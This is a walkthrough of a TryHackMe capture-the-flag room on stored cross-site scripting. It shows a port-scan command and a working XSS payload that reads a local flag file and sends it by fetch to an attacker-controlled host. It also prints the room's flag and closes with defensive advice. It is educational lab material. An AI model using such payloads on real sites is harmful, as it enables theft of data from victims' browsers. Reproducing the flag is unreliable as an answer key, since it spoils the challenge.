<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" lang="" xml:lang="">
<head>
  <meta charset="utf-8" />
  <meta name="generator" content="pandoc" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes" />
  <title>stickershop</title>
  <style>
    html {
      color: #1a1a1a;
      background-color: #fdfdfd;
    }
    body {
      margin: 0 auto;
      max-width: 36em;
      padding-left: 50px;
      padding-right: 50px;
      padding-top: 50px;
      padding-bottom: 50px;
      hyphens: auto;
      overflow-wrap: break-word;
      text-rendering: optimizeLegibility;
      font-kerning: normal;
    }
    @media (max-width: 600px) {
      body {
        font-size: 0.9em;
        padding: 12px;
      }
      h1 {
        font-size: 1.8em;
      }
    }
    @media print {
      html {
        background-color: white;
      }
      body {
        background-color: transparent;
        color: black;
        font-size: 12pt;
      }
      p, h2, h3 {
        orphans: 3;
        widows: 3;
      }
      h2, h3, h4 {
        page-break-after: avoid;
      }
    }
    p {
      margin: 1em 0;
    }
    a {
      color: #1a1a1a;
    }
    a:visited {
      color: #1a1a1a;
    }
    img {
      max-width: 100%;
    }
    svg {
      height: auto;
      max-width: 100%;
    }
    h1, h2, h3, h4, h5, h6 {
      margin-top: 1.4em;
    }
    h5, h6 {
      font-size: 1em;
      font-style: italic;
    }
    h6 {
      font-weight: normal;
    }
    ol, ul {
      padding-left: 1.7em;
      margin-top: 1em;
    }
    li > ol, li > ul {
      margin-top: 0;
    }
    blockquote {
      margin: 1em 0 1em 1.7em;
      padding-left: 1em;
      border-left: 2px solid #e6e6e6;
      color: #606060;
    }
    code {
      font-family: Menlo, Monaco, Consolas, 'Lucida Console', monospace;
      font-size: 85%;
      margin: 0;
      hyphens: manual;
    }
    pre {
      margin: 1em 0;
      overflow: auto;
    }
    pre code {
      padding: 0;
      overflow: visible;
      overflow-wrap: normal;
    }
    .sourceCode {
     background-color: transparent;
     overflow: visible;
    }
    hr {
      background-color: #1a1a1a;
      border: none;
      height: 1px;
      margin: 1em 0;
    }
    table {
      margin: 1em 0;
      border-collapse: collapse;
      width: 100%;
      overflow-x: auto;
      display: block;
      font-variant-numeric: lining-nums tabular-nums;
    }
    table caption {
      margin-bottom: 0.75em;
    }
    tbody {
      margin-top: 0.5em;
      border-top: 1px solid #1a1a1a;
      border-bottom: 1px solid #1a1a1a;
    }
    th {
      border-top: 1px solid #1a1a1a;
      padding: 0.25em 0.5em 0.25em 0.5em;
    }
    td {
      padding: 0.125em 0.5em 0.25em 0.5em;
    }
    header {
      margin-bottom: 4em;
      text-align: center;
    }
    #TOC li {
      list-style: none;
    }
    #TOC ul {
      padding-left: 1.3em;
    }
    #TOC > ul {
      padding-left: 0;
    }
    #TOC a:not(:hover) {
      text-decoration: none;
    }
    code{white-space: pre-wrap;}
    span.smallcaps{font-variant: small-caps;}
    div.columns{display: flex; gap: min(4vw, 1.5em);}
    div.column{flex: auto; overflow-x: auto;}
    div.hanging-indent{margin-left: 1.5em; text-indent: -1.5em;}
    /* The extra [class] is a hack that increases specificity enough to
       override a similar rule in reveal.js */
    ul.task-list[class]{list-style: none;}
    ul.task-list li input[type="checkbox"] {
      font-size: inherit;
      width: 0.8em;
      margin: 0 0.8em 0.2em -1.6em;
      vertical-align: middle;
    }
    .display.math{display: block; text-align: center; margin: 0.5rem auto;}
    /* CSS for syntax highlighting */
    pre > code.sourceCode { white-space: pre; position: relative; }
    pre > code.sourceCode > span { line-height: 1.25; }
    pre > code.sourceCode > span:empty { height: 1.2em; }
    .sourceCode { overflow: visible; }
    code.sourceCode > span { color: inherit; text-decoration: inherit; }
    div.sourceCode { margin: 1em 0; }
    pre.sourceCode { margin: 0; }
    @media screen {
    div.sourceCode { overflow: auto; }
    }
    @media print {
    pre > code.sourceCode { white-space: pre-wrap; }
    pre > code.sourceCode > span { display: inline-block; text-indent: -5em; padding-left: 5em; }
    }
    pre.numberSource code
      { counter-reset: source-line 0; }
    pre.numberSource code > span
      { position: relative; left: -4em; counter-increment: source-line; }
    pre.numberSource code > span > a:first-child::before
      { content: counter(source-line);
        position: relative; left: -1em; text-align: right; vertical-align: baseline;
        border: none; display: inline-block;
        -webkit-touch-callout: none; -webkit-user-select: none;
        -khtml-user-select: none; -moz-user-select: none;
        -ms-user-select: none; user-select: none;
        padding: 0 4px; width: 4em;
        color: #aaaaaa;
      }
    pre.numberSource { margin-left: 3em; border-left: 1px solid #aaaaaa;  padding-left: 4px; }
    div.sourceCode
      {   }
    @media screen {
    pre > code.sourceCode > span > a:first-child::before { text-decoration: underline; }
    }
    code span.al { color: #ff0000; font-weight: bold; } /* Alert */
    code span.an { color: #60a0b0; font-weight: bold; font-style: italic; } /* Annotation */
    code span.at { color: #7d9029; } /* Attribute */
    code span.bn { color: #40a070; } /* BaseN */
    code span.bu { color: #008000; } /* BuiltIn */
    code span.cf { color: #007020; font-weight: bold; } /* ControlFlow */
    code span.ch { color: #4070a0; } /* Char */
    code span.cn { color: #880000; } /* Constant */
    code span.co { color: #60a0b0; font-style: italic; } /* Comment */
    code span.cv { color: #60a0b0; font-weight: bold; font-style: italic; } /* CommentVar */
    code span.do { color: #ba2121; font-style: italic; } /* Documentation */
    code span.dt { color: #902000; } /* DataType */
    code span.dv { color: #40a070; } /* DecVal */
    code span.er { color: #ff0000; font-weight: bold; } /* Error */
    code span.ex { } /* Extension */
    code span.fl { color: #40a070; } /* Float */
    code span.fu { color: #06287e; } /* Function */
    code span.im { color: #008000; font-weight: bold; } /* Import */
    code span.in { color: #60a0b0; font-weight: bold; font-style: italic; } /* Information */
    code span.kw { color: #007020; font-weight: bold; } /* Keyword */
    code span.op { color: #666666; } /* Operator */
    code span.ot { color: #007020; } /* Other */
    code span.pp { color: #bc7a00; } /* Preprocessor */
    code span.sc { color: #4070a0; } /* SpecialChar */
    code span.ss { color: #bb6688; } /* SpecialString */
    code span.st { color: #4070a0; } /* String */
    code span.va { color: #19177c; } /* Variable */
    code span.vs { color: #4070a0; } /* VerbatimString */
    code span.wa { color: #60a0b0; font-weight: bold; font-style: italic; } /* Warning */
  </style>
</head>
<body>
<h1 id="tryhackme---the-sticker-shop--walkthrough">TryHackMe - The
Sticker Shop -walkthrough</h1>
<p>This is a challenge room from TRYHACKME - It walk us through a
realistic scenario that highlights real world impacts of client-side
vulnerability, specifically Stored Cross Site Scripting(Stored XSS)</p>
<p>Description:</p>
<div class="sourceCode" id="cb1"><pre
class="sourceCode coffeescript"><code class="sourceCode coffee"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a>Your local sticker shop has <span class="kw">finally</span> developed its own webpage<span class="kw">.</span> They <span class="kw">do</span> <span class="kw">not</span> have too much experience regarding web development<span class="kw">,</span> so they decided to develop <span class="kw">and</span> host everything <span class="ot">on</span> the same computer that they use <span class="kw">for</span> browsing the internet <span class="kw">and</span> looking at customer feedback<span class="kw">.</span> Smart move<span class="kw">!</span></span></code></pre></div>
<p>Can you read the flag at
<code>http://10.10.151.152:8080/flag.txt</code>?</p>
<p><strong>Goal</strong>:</p>
<div class="sourceCode" id="cb2"><pre
class="sourceCode coffeescript"><code class="sourceCode coffee"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a> Find a way to read the contents <span class="kw">of</span> <span class="kw">/</span>flag<span class="kw">.</span>txt ‚Äî a file that <span class="kw">is</span> restricted to local access<span class="kw">.</span></span></code></pre></div>
<h3 id="recon-enumeration">Recon &amp; Enumeration</h3>
<p>I used RustScan and Nmap to figure out which ports are open and what
services are running in the machine</p>
<div class="sourceCode" id="cb3"><pre
class="sourceCode coffeescript"><code class="sourceCode coffee"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a>rustscan <span class="kw">-</span>r <span class="dv">1-65535</span> <span class="kw">-</span>a <span class="dv">10</span><span class="kw">.</span><span class="dv">10</span><span class="kw">.</span><span class="fl">151.152</span> <span class="kw">--</span> <span class="kw">-</span>sV <span class="kw">-</span>sC <span class="kw">-</span>T4 <span class="kw">-</span>oN scan_results</span></code></pre></div>
<figure>
<img src="TryHackMe%20-%20The%20Sticker%20Shop%20-walkthrough/image.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>From the nmap results I saw the web service running on port 8080, I
navigated to the site and found a webpage for cat sticker shop,</p>
<p>Exploring the site further, I found a feedback section where users
input their feedback and which is sent to the server in POST request. It
looks a potential entry point for client side attacks</p>
<figure>
<img
src="TryHackMe%20-%20The%20Sticker%20Shop%20-walkthrough/image%201.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>I tried to access the flag directly from the browser, but it throws
403 (expected obviously). This tells us the file is restricted to local
users only, such as the browser used by local users/admins</p>
<h2 id="exploitation---stored-xss-vulnerability">Exploitation - Stored
XSS vulnerability</h2>
<p>I navigated back to the feedback page to test for Client Side
Attacks.</p>
<p>Since the feedback is reviewed by some local user/admin or owner
which is using the same computer to host the site, if I can submit a
Cross Site Scripting(stored one) payload on the feedback input box, I
can execute the javascript on the reviewers browser which allows me to
send the flag to a server I control</p>
<p>I used the following malicious JS code</p>
<div class="sourceCode" id="cb4"><pre
class="sourceCode coffeescript"><code class="sourceCode coffee"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="st">&#39;&quot;&gt;&lt;script&gt;</span></span>
<span id="cb4-2"><a href="#cb4-2" aria-hidden="true" tabindex="-1"></a><span class="st">   fetch(&#39;</span>http<span class="kw">:</span><span class="st">//</span><span class="dv">127</span><span class="kw">.</span><span class="dv">0</span><span class="kw">.</span><span class="fl">0.1</span><span class="kw">:</span><span class="dv">8080</span><span class="kw">/</span>flag<span class="kw">.</span>txt<span class="st">&#39;)</span></span>
<span id="cb4-3"><a href="#cb4-3" aria-hidden="true" tabindex="-1"></a><span class="st">        .then(response =&gt; response.text())</span></span>
<span id="cb4-4"><a href="#cb4-4" aria-hidden="true" tabindex="-1"></a><span class="st">        .then(data =&gt; {</span></span>
<span id="cb4-5"><a href="#cb4-5" aria-hidden="true" tabindex="-1"></a><span class="st">            fetch(&#39;</span>http<span class="kw">:</span><span class="st">//m</span>y<span class="kw">-</span>ip<span class="kw">/?</span>flag<span class="kw">=</span><span class="st">&#39; + encodeURIComponent(data))</span></span>
<span id="cb4-6"><a href="#cb4-6" aria-hidden="true" tabindex="-1"></a><span class="st">        })</span></span>
<span id="cb4-7"><a href="#cb4-7" aria-hidden="true" tabindex="-1"></a><span class="st">&lt;/script&gt;</span></span></code></pre></div>
<p>Explanation of the payload, what each piece does:</p>
<ul>
<li><code>'" &gt;&lt;script&gt;</code> ‚Äî closes whatever attribute/HTML
context precedes it and opens a script tag.</li>
<li><code>fetch('http://127.0.0.1:8080/flag.txt')</code> ‚Äî issues an
HTTP GET to the local loopback service on port 8080 asking for
<code>flag.txt</code>.</li>
<li><code>.then(response =&gt; response.text())</code> ‚Äî converts the
response body to plain text.</li>
<li><code>.then(data =&gt; { fetch('http://10.21.89.255/?flag=' + encodeURIComponent(data)) })</code>
‚Äî sends the retrieved text to an attacker-controlled server by issuing
another HTTP request with the data in the query string.
<code>encodeURIComponent</code> URL-escapes the payload to keep it valid
in a URL.</li>
</ul>
<p>After submitting the payload and waiting a few moments, my python
server received get request containing the room‚Äôs Flag(url encoded) in
the flag param we sent.</p>
<figure>
<img
src="TryHackMe%20-%20The%20Sticker%20Shop%20-walkthrough/image%202.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>BOOM!!! - There we go</p>
<p>Here is the decoded flag ‚áí
THM{83789a69074f636f64a38879cfcabe8b62305ee6}</p>
<p>I recommend doing all the steps by yourself and decode the flag using
tons of tools out there, I was using <strong>Caido</strong> in my
case</p>
<p>üîê <strong>Lesson learned</strong>:</p>
<ul>
<li>XSS runs attacker JS in a victim‚Äôs browser.</li>
<li>It can reach internal endpoints the attacker cannot.</li>
<li>It can steal files, tokens, and perform actions as the user.</li>
</ul>
<p>If your are web dev or owner, it is recommended to</p>
<ul>
<li>Escape/encode all user output by context.</li>
<li>Sanitize any allowed HTML (e.g., DOMPurify).</li>
<li>Enforce strict CSP and HttpOnly/Secure/SameSite cookies.</li>
</ul>
</body>
</html>
